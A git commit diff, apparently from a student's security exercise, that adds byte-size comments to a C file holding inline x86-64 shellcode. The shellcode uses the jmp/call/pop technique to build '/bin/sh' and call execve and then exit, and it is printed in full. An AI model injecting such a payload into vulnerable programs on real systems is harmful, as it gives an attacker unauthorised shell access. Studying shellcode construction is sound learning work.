e9a287a0c49d2d3182168ac37b35b7133ea7671c
Nalam V S S Krishna Chaitanya <cs13b021@smail.iitm.ac.in>
2015-12-28 13:08:46 +0530

    shellcode byte sizes are written and checked.

--- shellcode.c
+++ shellcode.c
@@ -3,22 +3,22 @@
 void main()
 {
 __asm__ (
-		"jmp .+0x29;"
-		"pop %rbx;"
-		"mov %rbx, 0x8(%rbx);"
-		"xorq %rax, %rax;"
-		"movb %ah, 0x7(%rbx);"
-		"movq %rax, 0x10(%rbx);"
-		"mov %eax, %edx;"
-		"movb $0x3b, %al;"
-		"mov 0x8(%rbx), %rdi;"
-		"lea 0x8(%rbx), %rsi;"
-		"syscall;"
-		"xorq %rcx, %rcx;"
-		"mov %rcx, %rdi;"
-		"movb $0x3c, %al;"
-		"syscall;"
-		"call .-0x27;"
+		"jmp .+0x29;"				// 2 bytes
+		"pop %rbx;"					// 1 byte
+		"mov %rbx, 0x8(%rbx);"		// 4 bytes
+		"xorq %rax, %rax;"			// 3 bytes
+		"movb %ah, 0x7(%rbx);"		// 3 bytes
+		"movq %rax, 0x10(%rbx);"	// 4 bytes
+		"mov %eax, %edx;"			// 2 bytes
+		"movb $0x3b, %al;"			// 2 bytes
+		"mov 0x8(%rbx), %rdi;"		// 4 bytes
+		"lea 0x8(%rbx), %rsi;"		// 4 bytes
+		"syscall;"					// 2 bytes
+		"xorq %rcx, %rcx;"			// 3 bytes
+		"mov %rcx, %rdi;"			// 3 bytes
+		"movb $0x3c, %al;"			// 2 bytes
+		"syscall;"					// 2 bytes
+		"call .-0x27;"				// 5 bytes
 		".string \"/bin/sh                 \";"
 );
 }
